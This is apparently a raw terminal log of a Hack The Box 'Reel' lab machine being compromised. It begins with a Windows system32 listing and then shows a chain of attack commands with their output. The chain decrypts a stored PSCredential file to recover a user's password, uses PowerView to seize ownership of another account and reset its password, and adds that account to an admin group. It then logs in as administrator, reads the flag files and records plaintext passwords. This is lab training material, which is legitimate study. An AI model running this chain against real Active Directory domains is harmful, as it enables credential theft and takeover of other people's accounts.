+29/10/2014  01:46            57,344 vfwwdm32.dll
+29/10/2014  01:05            31,744 vidcap.ax
+29/10/2014  01:05            30,208 virtdisk.dll
+17/03/2017  07:00           100,816 vm3ddevapi.dll
+17/03/2017  07:00        11,847,128 vm3dgl.dll
+17/03/2017  07:00           326,104 vm3dum.dll
+17/03/2017  07:00           219,608 vm3dum_10.dll
+17/03/2017  06:56           295,912 vmGuestLib.dll
+17/03/2017  06:56            44,008 vmGuestLibJava.dll
+17/03/2017  06:53           129,600 vmhgfs.dll
+29/10/2014  01:05            28,160 vpnikeapi.dll
+29/10/2014  01:54            12,288 VscMgrPS.dll
+10/02/2017  23:10            65,016 vsocklib.dll
+29/10/2014  01:30           111,616 vssadmin.exe
+29/10/2014  00:48         1,142,272 vssapi.dll
+29/10/2014  00:59            55,296 vsstrace.dll
+31/01/2014  10:04           151,552 VSSUI.dll
+22/08/2013  03:52            57,856 VSSUIRUN.exe
+29/10/2014  01:01            28,160 vss_ps.dll
+29/10/2014  01:03            70,656 w32tm.exe
+29/10/2014  01:05            28,672 w32topl.dll
+29/10/2014  01:35            59,392 WABSyncProvider.dll
+29/10/2014  01:48            32,256 waitfor.exe
+29/10/2014  01:49            11,264 wamregps.dll
+29/10/2014  01:35           230,400 wavemsp.dll
+21/01/2018  23:26    <DIR>          wbem
+29/10/2014  01:00           401,408 wbemcomn.dll
+29/10/2014  01:04            27,648 wcmapi.dll
+29/10/2014  01:38            34,304 WcsPlugInService.dll
+11/06/2017  20:40         1,323,008 wdc.dll
+22/08/2013  15:39    <DIR>          wdi
+29/10/2014  01:00            84,992 wdi.dll
+06/05/2016  15:35           193,024 wdigest.dll
+29/10/2014  00:53           197,120 wdmaud.drv
+29/10/2014  01:00           207,872 wdscore.dll
+14/10/2017  06:25           230,400 webcheck.dll
+29/10/2014  00:59           413,696 webio.dll
+29/10/2014  03:10         1,178,104 webservices.dll
+29/10/2014  01:05            35,840 Websocket.dll
+29/10/2014  01:03            59,392 wecapi.dll
+29/10/2014  01:02            80,384 wecutil.exe
+17/08/2017  22:03           450,392 wer.dll
+14/07/2017  18:44            33,280 werdiagcontroller.dll
+29/10/2014  03:12           413,136 WerFault.exe
+08/12/2014  19:42            33,584 WerFaultSecure.exe
+17/08/2017  22:03           136,832 wermgr.exe
+29/10/2014  01:30           160,256 werui.dll
+12/07/2017  20:25           308,872 wevtapi.dll
+29/10/2014  01:56            82,432 wevtfwd.dll
+29/10/2014  00:57           177,664 wevtutil.exe
+31/10/2014  03:28           137,728 wextract.exe
+18/06/2013  12:25           115,091 WF.msc
+29/10/2014  01:02            20,480 wfapigp.dll
+29/10/2014  00:43            65,536 WfHC.dll
+29/10/2014  01:51            33,792 where.exe
+29/10/2014  01:05            11,776 whhelper.dll
+29/10/2014  01:48            57,856 whoami.exe
+01/02/2014  06:00             2,255 WimBootCompress.ini
+29/10/2014  00:54           560,640 wimgapi.dll
+29/10/2014  01:02            74,240 winbio.dll
+29/10/2014  01:03            29,184 winbrand.dll
+16/04/2017  07:02           267,776 wincorlib.dll
+29/10/2014  01:43            37,888 wincredprovider.dll
+29/10/2014  00:46           296,448 Windows.ApplicationModel.dll
+29/10/2014  00:55           223,744 Windows.ApplicationModel.Store.dll
+29/10/2014  00:46           210,944 Windows.ApplicationModel.Store.TestingFramework.dll
+13/08/2017  15:18         5,270,016 Windows.Data.Pdf.dll
+29/10/2014  00:58           164,864 Windows.Devices.Enumeration.dll
+29/10/2014  01:01            27,648 Windows.Devices.Enumeration.ps.dll
+29/10/2014  00:55           173,056 Windows.Devices.HumanInterfaceDevice.dll
+29/10/2014  01:00            33,280 Windows.Devices.Printers.Extensions.dll
+29/10/2014  00:50           624,128 Windows.Devices.SmartCards.dll
+29/10/2014  01:20           310,272 Windows.Devices.Usb.dll
+05/10/2016  14:00           868,864 Windows.Globalization.dll
+29/10/2014  01:03            42,496 Windows.Globalization.Fontgroups.dll
+29/10/2014  00:51           244,224 Windows.Graphics.dll
+29/10/2014  00:47           451,584 Windows.Graphics.Printing.dll
+29/10/2014  01:46            19,968 Windows.Management.Workplace.WorkplaceSettings.dll
+29/10/2014  00:58            78,848 Windows.Media.Devices.dll
+29/10/2014  03:11           191,104 Windows.Media.MediaControl.dll
+29/10/2014  00:42           175,616 Windows.Media.SpeechSynthesis.dll
+29/10/2014  00:35           442,368 Windows.Networking.BackgroundTransfer.dll
+29/10/2014  00:50           430,592 Windows.Networking.Connectivity.dll
+29/10/2014  00:47           470,016 Windows.Networking.dll
+29/10/2014  01:00           103,424 Windows.Networking.HostName.dll
+29/10/2014  01:00            62,976 Windows.Networking.Sockets.PushEnabledApplication.dll
+29/10/2014  03:15            73,840 Windows.Security.Credentials.UI.CredentialPicker.dll
+29/10/2014  01:43            84,480 Windows.Security.Credentials.UI.UserConsentVerifier.dll
+29/10/2014  02:00            35,328 Windows.Shell.Search.UriHandler.dll
+29/10/2014  03:18           164,264 Windows.Storage.ApplicationData.dll
+29/10/2014  01:00           126,464 Windows.Storage.Compression.dll
+29/10/2014  01:00            23,040 Windows.System.Display.dll
+29/10/2014  00:43           181,248 Windows.System.Profile.HardwareId.dll
+29/10/2014  01:00            17,920 Windows.System.RemoteDesktop.dll
+09/04/2016  21:50           375,296 Windows.UI.dll
+22/07/2015  14:25         1,546,752 Windows.UI.Immersive.dll
+29/10/2014  00:57           141,824 Windows.UI.Input.Inking.dll
+29/10/2014  00:37         6,386,176 Windows.UI.Search.dll
+29/10/2014  01:33        15,157,760 Windows.UI.Xaml.dll
+29/10/2014  00:39           565,248 Windows.Web.dll
+29/10/2014  00:52           827,392 Windows.Web.Http.dll
+11/03/2017  03:56         1,489,608 WindowsCodecs.dll
+29/10/2014  00:58           246,272 WindowsCodecsExt.dll
+22/08/2013  15:39    <DIR>          WindowsPowerShell
+13/05/2016  21:26           631,808 winhttp.dll
+07/11/2017  20:04         2,767,872 wininet.dll
+29/10/2014  01:02            17,920 wininitext.dll
+29/10/2014  01:02            72,704 winipsec.dll
+29/10/2014  01:00           355,328 Winlangdb.dll
+22/08/2013  15:39    <DIR>          WinMetadata
+29/10/2014  03:07           136,840 winmm.dll
+29/10/2014  03:07           134,280 winmmbase.dll
+29/10/2014  01:40           109,056 WinMsoIrmProtector.dll
+29/10/2014  03:05            26,304 winnsi.dll
+29/10/2014  01:40           103,936 WinOpcIrmProtector.dll
+22/08/2013  16:05    <DIR>          winrm
+18/06/2013  12:41                35 winrm.cmd
+18/06/2013  12:41           204,105 winrm.vbs
+29/10/2014  01:59            23,040 winrnr.dll
+29/10/2014  00:52            41,472 winrs.exe
+29/10/2014  00:51            95,744 winrscmd.dll
+29/10/2014  00:57            23,552 winrshost.exe
+22/08/2013  04:16             1,536 winrsmgr.dll
+29/10/2014  01:05            11,264 winrssrv.dll
+25/12/2016  00:19           170,496 WinSCard.dll
+29/10/2014  01:01           278,528 winsku.dll
+29/10/2014  01:33            68,608 winsockhc.dll
+03/09/2016  15:58           397,824 winspool.drv
+29/10/2014  01:58            17,920 WINSRPC.DLL
+29/10/2014  03:10           276,816 winsta.dll
+28/12/2015  20:31           578,048 WinSync.dll
+29/10/2014  01:49           189,440 WinSyncMetastore.dll
+29/10/2014  01:38           115,712 WinSyncProviders.dll
+05/10/2016  04:15           245,320 wintrust.dll
+16/04/2017  09:07           548,032 WinTypes.dll
+29/10/2014  01:51            20,480 winusb.dll
+29/10/2014  01:52            56,832 winver.exe
+29/10/2014  03:15            59,904 wkscli.dll
+29/10/2014  01:23            93,696 wkspbrokerAx.dll
+29/10/2014  01:49            16,896 wksprtPS.dll
+29/10/2014  00:50           399,360 wlangpui.dll
+29/10/2014  01:49            19,968 wlaninst.dll
+22/08/2013  04:14             3,072 wlanutil.dll
+01/08/2017  08:25           324,096 Wldap32.dll
+29/10/2014  01:01            96,256 wlgpclnt.dll
+29/10/2014  01:59             9,216 WlS0WndH.dll
+29/10/2014  02:03             5,632 wmi.dll
+29/10/2014  01:06            33,280 wmiclnt.dll
+29/10/2014  00:59           132,608 wmidcom.dll
+29/10/2014  01:45            24,576 wmiprop.dll
+13/03/2017  16:13           159,232 wmitomi.dll
+28/01/2015  01:11           357,376 WMPhoto.dll
+29/10/2014  01:05            13,312 wmsgapi.dll
+03/12/2015  16:29           887,296 WMSPDMOD.DLL
+29/10/2014  01:15             5,632 wow32.dll
+29/10/2014  01:43            14,848 wowreg32.exe
+29/10/2014  00:59           286,720 wpnapps.dll
+29/10/2014  01:52             9,728 write.exe
+29/10/2014  02:04             4,608 ws2help.dll
+14/05/2016  20:01           320,720 ws2_32.dll
+29/10/2014  00:44           172,544 WSClient.dll
+29/10/2014  01:38           148,992 wscript.exe
+09/05/2017  14:35           555,520 WSDApi.dll
+09/05/2017  14:29            25,600 wsdchngr.dll
+29/10/2014  00:48           265,728 WSDMon.dll
+29/10/2014  01:24         1,335,296 wsecedit.dll
+29/10/2014  01:51            21,504 wshcon.dll
+29/10/2014  01:48            15,872 wshelper.dll
+29/10/2014  01:33            80,896 wshext.dll
+29/10/2014  02:03            10,752 wship6.dll
+29/10/2014  01:38           121,344 wshom.ocx
+29/10/2014  01:05            15,872 wshqos.dll
+29/10/2014  01:58            14,848 wshrm.dll
+29/10/2014  02:03            10,240 WSHTCPIP.DLL
+02/02/2016  16:46            26,112 WsmAgent.dll
+18/06/2013  12:41             4,675 wsmanconfig_schema.xml
+29/10/2014  01:37            31,744 WSManHTTPConfig.exe
+29/10/2014  01:14            58,880 WSManMigrationPlugin.dll
+02/02/2016  17:19           144,384 WsmAuto.dll
+29/10/2014  01:05            11,776 wsmplpxy.dll
+29/10/2014  01:39            35,328 wsmprovhost.exe
+18/06/2013  12:41             1,559 WsmPty.xsl
+22/08/2013  04:15            60,416 WsmRes.dll
+22/08/2013  03:40           121,856 Wsmselpl.dll
+22/08/2013  04:16             2,048 Wsmselrr.dll
+13/03/2017  16:07         2,170,880 WsmSvc.dll
+18/06/2013  12:41             2,426 WsmTxt.xsl
+13/03/2017  16:06           236,032 WsmWmiPl.dll
+29/10/2014  01:59            53,760 wsnmp32.dll
+29/10/2014  01:59            16,384 wsock32.dll
+29/10/2014  00:35           811,008 WSShared.dll
+29/10/2014  00:54           178,688 WSSync.dll
+29/10/2014  03:10            52,664 wtsapi32.dll
+12/05/2017  15:47           726,528 wuapi.dll
+12/05/2017  15:51            29,696 wuapp.exe
+12/05/2017  15:48            81,920 wudriver.dll
+27/06/2015  02:14            27,136 wups.dll
+29/10/2014  01:42           305,664 wusa.exe
+12/05/2017  15:50           124,928 wuwebv.dll
+11/06/2017  21:25           478,720 wvc.dll
+29/10/2014  02:00           153,088 WwaApi.dll
+29/10/2014  00:31           626,176 WWAHost.exe
+29/10/2014  01:04            44,544 xcopy.exe
+29/10/2014  01:25            46,592 xmlfilter.dll
+29/10/2014  03:13           185,880 xmllite.dll
+29/10/2014  01:57            17,408 xmlprovi.dll
+30/08/2016  02:18            50,688 xolehlp.dll
+29/10/2014  01:31           342,016 XpsGdiConverter.dll
+29/10/2014  00:38         1,262,080 XpsPrint.dll
+29/10/2014  01:46           148,480 XpsRasterService.dll
+29/10/2014  00:40         2,104,832 xpsservices.dll
+29/10/2014  01:47           982,016 xpssvcs.dll
+18/06/2013  12:37             4,014 xwizard.dtd
+29/10/2014  01:43            56,320 xwizard.exe
+29/10/2014  01:27           397,824 xwizards.dll
+29/10/2014  01:35           100,352 xwreg.dll
+29/10/2014  01:28           214,016 xwtpdui.dll
+29/10/2014  01:28           121,856 xwtpw32.dll
+22/08/2013  15:39    <DIR>          zh-CN
+22/08/2013  15:39    <DIR>          zh-HK
+22/08/2013  15:39    <DIR>          zh-TW
+29/10/2014  01:38           404,480 zipfldr.dll
+            2166 File(s)    944,024,801 bytes
+              86 Dir(s)   4,974,780,416 bytes free
+
+C:\Windows\system32>whoami
+whoami
+htb\nico
+
+C:\Windows\system32>cd /
+cd /
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CEBA-B613
+
+ Directory of C:\
+
+22/01/2018  00:27    <DIR>          inetpub
+22/08/2013  15:52    <DIR>          PerfLogs
+21/01/2018  15:08    <DIR>          Program Files
+21/01/2018  14:59    <DIR>          Program Files (x86)
+03/11/2017  23:09    <DIR>          Users
+21/01/2018  23:39    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   4,974,780,416 bytes free
+
+C:\>cd Users
+cd Users
+
+C:\Users>cd Desk
+cd Desk
+The system cannot find the path specified.
+
+C:\Users>cd Desktop
+cd Desktop
+The system cannot find the path specified.
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CEBA-B613
+
+ Directory of C:\Users
+
+03/11/2017  23:09    <DIR>          .
+03/11/2017  23:09    <DIR>          ..
+25/10/2017  20:48    <DIR>          .NET v2.0
+25/10/2017  20:48    <DIR>          .NET v2.0 Classic
+01/11/2017  21:58    <DIR>          .NET v4.5
+01/11/2017  21:58    <DIR>          .NET v4.5 Classic
+16/02/2018  23:29    <DIR>          Administrator
+04/11/2017  23:05    <DIR>          brad
+30/10/2017  23:00    <DIR>          claire
+25/10/2017  20:48    <DIR>          Classic .NET AppPool
+03/11/2017  23:09    <DIR>          herman
+31/10/2017  22:27    <DIR>          julia
+29/05/2018  22:37    <DIR>          nico
+22/08/2013  15:39    <DIR>          Public
+28/10/2017  21:32    <DIR>          SSHD
+16/11/2017  22:35    <DIR>          tom
+               0 File(s)              0 bytes
+              16 Dir(s)   4,974,256,128 bytes free
+
+C:\Users>cd nico
+cd nico
+
+C:\Users\nico>cd Desktop
+cd Desktop
+
+C:\Users\nico\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CEBA-B613
+
+ Directory of C:\Users\nico\Desktop
+
+28/05/2018  20:07    <DIR>          .
+28/05/2018  20:07    <DIR>          ..
+27/10/2017  23:59             1,468 cred.xml
+20/03/2023  14:59                34 user.txt
+               2 File(s)          1,502 bytes
+               2 Dir(s)   4,974,256,128 bytes free
+
+C:\Users\nico\Desktop>type user.txt
+type user.txt
+348738d2f521d07e23c32d788ab9b9d3
+
+C:\Users\nico\Desktop>type cred.xml
+type cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ssh tom@10.129.241.121
+tom@10.129.241.121's password: 
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom>whoami                                                                                                    
+htb\tom                                                                                                                         
+
+tom@REEL C:\Users\tom>cd Desktop                                                                                                
+
+tom@REEL C:\Users\tom\Desktop>dir                                                                                               
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop                                                                                              
+
+05/29/2018  07:57 PM    <DIR>          .                                                                                        
+05/29/2018  07:57 PM    <DIR>          ..                                                                                       
+05/29/2018  08:02 PM    <DIR>          AD Audit                                                                                 
+               0 File(s)              0 bytes                                                                                   
+               3 Dir(s)   4,974,084,096 bytes free                                                                              
+
+tom@REEL C:\Users\tom\Desktop>cd "AD Audit"                                                                                     
+
+tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                                                                      
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit                                                                                     
+
+05/29/2018  08:02 PM    <DIR>          .                                                                                        
+05/29/2018  08:02 PM    <DIR>          ..                                                                                       
+05/29/2018  11:44 PM    <DIR>          BloodHound                                                                               
+05/29/2018  08:02 PM               182 note.txt                                                                                 
+               1 File(s)            182 bytes                                                                                   
+               3 Dir(s)   4,974,084,096 bytes free                                                                              
+
+tom@REEL C:\Users\tom\Desktop\AD Audit>cd BloodHound                                                                            
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir                                                                           
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                                                                          
+
+05/29/2018  11:44 PM    <DIR>          .                                                                                        
+05/29/2018  11:44 PM    <DIR>          ..                                                                                       
+05/29/2018  07:57 PM    <DIR>          Ingestors                                                                                
+10/30/2017  10:15 PM           769,587 PowerView.ps1                                                                            
+               1 File(s)        769,587 bytes                                                                                   
+               3 Dir(s)   4,974,084,096 bytes free                                                                              
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>Import-Module .\PowerView.ps1                                                 
+'Import-Module' is not recognized as an internal or external command,                                                           
+operable program or batch file.                                                                                                 
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>powershell                                                                    
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                      
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                          
+PS C:\Users\tom\Desktop\AD Audit\BloodHound>  Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPas
+sword                                                                                                                           
+PS C:\Users\tom\Desktop\AD Audit\BloodHound>  $creds = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force                  
+PS C:\Users\tom\Desktop\AD Audit\BloodHound>  Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose          
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
+VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset                                                 
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> exit                                                                               
+
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>exitConnection to 10.129.241.121 closed.      
+
+# now connect in second user with ssh 
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ssh claire@10.129.241.121
+claire@10.129.241.121's password: 
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire>whoami                                                                                              
+htb\claire                                                                                                                      
+
+claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                 
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>net group backup_admins                                                                             
+Group name     Backup_Admins                                                                                                    
+Comment                                                                                                                         
+
+Members                                                                                                                         
+
+-------------------------------------------------------------------------------                                                 
+claire                   ranj                                                                                                   
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>cd ..                                                                                               
+
+claire@REEL C:\Users>icacls Administrator                                                                                       
+Administrator: Access is denied.                                                                                                
+Successfully processed 0 files; Failed processing 1 files                                                                       
+
+claire@REEL C:\Users>cd Administrator                                                                                           
+Access is denied.                                                                                                               
+
+claire@REEL C:\Users>C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                        
+Access is denied.                                                                                                               
+
+claire@REEL C:\Users>exitConnection to 10.129.241.121 closed.
+
+# now login administrator with ssh 
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ssh administrator@10.129.241.121  
+administrator@10.129.241.121's password: 
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@REEL C:\Users\Administrator>whoami                                                                                
+htb\administrator                                                                                                               
+
+administrator@REEL C:\Users\Administrator>cd Desktop                                                                            
+
+administrator@REEL C:\Users\Administrator\Desktop>dir                                                                           
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\Administrator\Desktop                                                                                    
+
+21/01/2018  14:56    <DIR>          .                                                                                           
+21/01/2018  14:56    <DIR>          ..                                                                                          
+02/11/2017  21:47    <DIR>          Backup Scripts                                                                              
+20/03/2023  14:59                34 root.txt                                                                                    
+               1 File(s)             34 bytes                                                                                   
+               3 Dir(s)   4,974,084,096 bytes free                                                                              
+
+administrator@REEL C:\Users\Administrator\Desktop>type root.txt                                                                 
+1a46171849a2c84ef35754c2eca09e26                                                                                                
+
+administrator@REEL C:\Users\Administrator\Desktop>type C:\Users\nico\Desktop\user.txt                                           
+348738d2f521d07e23c32d788ab9b9d3                                                                                                
+
+administrator@REEL C:\Users\Administrator\Desktop>exitConnection to 10.129.241.121 closed.
+
+
+# username :  Administrator
+# password : Cr4ckMeIfYouC4n!
